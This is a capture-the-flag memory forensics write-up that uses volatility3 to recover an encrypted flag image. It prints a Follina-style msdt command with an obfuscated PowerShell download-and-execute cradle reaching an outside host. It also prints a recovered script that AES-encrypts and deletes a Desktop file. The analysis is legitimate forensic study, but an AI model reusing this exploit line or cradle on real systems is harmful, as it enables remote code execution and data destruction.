# CyberSpace24 - Memory 

## Memory - Forensics

File : 

Validate the file. 
![image](https://hackmd.io/_uploads/SkUgQ9HnR.png)

It show the file are Windows OS. Since it in .mem which mean memory, run `volatility` to investigate it. 

:::info
I will use volatility3 for investigation.
:::

>Description
I left the image of the flag in the desktop but somehow it disappeared, can you help me recover it?

The description give a big hint where the images **dissappear** in ==Desktop== and ==recover==.

Run script to see command being execute before and this command really caught my eyes
```
1120    msdt.exe        "C:\Windows\system32\msdt.exe" ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuZG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEwLjg6ODA4MC9RT2FBZGNUNmRxLnBzMScp'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO"

```

Deobsfucate it.

```
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuZG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEwLjg6ODA4MC9RT2FBZGNUNmRxLnBzMScp"))

IEX(New-Object Net.WebClient).downloadString('http://192.168.10.8:8080/QOaAdcT6dq.ps1')
```

This reveals that a powershell script was run on gg’s machine. It also give a big hint where most powershell try to run in environment.

My teamate (Ox251e) manage to get file being deleted in Desktop. The file name as `flag.enc`


>In investigating memory, when we need to do some recover, most of data will store in cache or slack space. Using volatility tools, we can use plugin "mftscan.MFTScan" to get an overview. 

Since I know some part of it, using some magic string command to get it.

```
4$ifPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'flag.jpg')
$efPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'flag.enc')
$aes = New-Object System.Security.Cryptography.AesManaged
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.GenerateKey()
$aes.GenerateIV()
$cee = [System.Convert]::ToBase64String($aes.Key)
$vee = [System.Convert]::ToBase64String($aes.IV)
$content = [System.IO.File]::ReadAllBytes($ifPath)
$encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
$encryptedData = $encryptor.TransformFinalBlock($content, 0, $content.Length)
$encryptedBase64 = [System.Convert]::ToBase64String($encryptedData)
[System.IO.File]::WriteAllText($efPath, $encryptedBase64)
[System.Environment]::SetEnvironmentVariable("ENCD", $encryptedBase64, [System.EnvironmentVariableTarget]::User)
[System.Environment]::SetEnvironmentVariable("ENCK", $cee, [System.EnvironmentVariableTarget]::User)
[System.Environment]::SetEnvironmentVariable("ENCV", $vee, [System.EnvironmentVariableTarget]::User)
if (Test-Path $ifPath) {
    Remove-Item $ifPath -Force
4Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Try the new cross-platform PowerShell https://aka.ms/pscore6

```

The above script are powershell that being running and the one suspected being downloaded during previous activity. 

The script above do encryption on flag.png to flag.enc and using AES. The key, IV and encrypted data are shown as ENCK, ENCV and ENCD.

The script also mention about execution in environment which in investigation tools, it will use plugin "windows.envars"

```
0x14ba2d8a980   ENCD    ZmIx0TFZonSCqvD8Sp9Jfmc47L7XjylzHM8il7N3JYPj6lWI22Qa5UhY4OnYpu2eV1LLqwGGj/21ExPiySYmeQIl7yAnh2oPlB1V1+sV5B4Qk/CZk6mAAlF8IoDjtnbZ31qzEj9uaitqi+2RdnekDiKGFV9Y8LVvSfyNpsTUxig8Yja5vLgFhcNUDr3VR2tzcigiA7KLZshP4SbdmtskBckFfzOQqWt+2LB6mA7gFpEywn5lCaMJn5Ab4nI1uCCA9wsY52rnKaOsZ4CtbA6TwJYKeIdZuOBe1tOOhe/2eZpDajFM8fRQ82bislmnTx6siaXDbGR0LiymH+IDUaE1OItqGHOTlgeAEFl99ftN9ttbNVelmtvj5Zrp/rOzSCY9z7iTolu//PEAyaY4HMGi6+rm2u+XJDR14/RjUDItv1oqeDh7Xrfb97XmcC/oWxpudjCEf9Wnr5x4DlzsESN7Y4knE85arMsuoO7loI9tRUFYFFKjl8r+j1kjCYujTZ2aGhTm8ylwzpWeUOp3hVaGkHe6/s6PjRQHc3gzN9PohcgQRUP41bzQ9nkvYc6VyPGzd4UGnSPrHKjVRBmAJbkI9hFUifjDjmCdh4e0NDMUJ7hiwbihLowiSc61JsFK7Py9XVHTq8ftr0twwhr34k3XWuXEb4M0CkO2GSHOj0GpU4giaTMEE+5mddAI2NLg00pbNOpZPsRx13dcHT7Amx4MKWKzKFaS1eX9qqcMGSiwqcj1lAG8/wqVoU9YxLkWbcaRn+4PyUEsSsA3SDMnxIhQLyAy4TkQJanYHjqeZ776eVclpFxEUxKAB2D5PAXW7mvC6c0UrQYWaheheQFjm2floB5Ip3JWZxOfFD7L+9Cpf24R/VpRE3BaWSKDGqOYx6+WzQiyuyLs+Gkd/Bbv0lcYc8qY8D3wuS2PjFpQ9zCVYihfxLXs0rV+kP2eRsHKTHFP77ZIf1C4Kn4xddsBhjAuXUruj6CXT4Nz26U+3gLVD57dMOGT+wMfO0Jh4yP+TDZXju3ys1N4R ---snippet
0x1ef37c7a980   ENCK    dF3luZxgMqMjdv26DTzAZqhRHyQsLOiQCajdl6IapdE=
0x1ef37c7a980   ENCV    Yf1YXfocPY/iDTpVUsfklA==

```

Using any online tool to decode it and it will give you png file. 

![image](https://hackmd.io/_uploads/r13Rd5S20.png)


